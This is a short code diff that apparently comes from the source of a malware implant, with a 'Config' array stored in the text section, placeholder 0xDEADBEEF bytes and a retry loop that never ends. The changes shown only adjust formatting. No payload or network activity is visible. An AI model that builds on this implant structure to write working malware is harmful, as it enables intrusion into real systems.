@@ -13,6 +13,7 @@ VOID Entrypoint(HMODULE Base) {
 }
 
 namespace Implant {
+
     TXT_SECTION(F) BYTE Config[1024] = {
         0xDE,0xAD,0xBE,0xEF, 0xDE,0xAD,0xBE,0xEF,
     };
@@ -46,8 +47,7 @@ namespace Implant {
             } else {
                 Ctx->Session.Retry = 0;
             }
-        }
-        while (TRUE);
+        } while (TRUE);
 
     defer:
         FreeApi(Ctx);
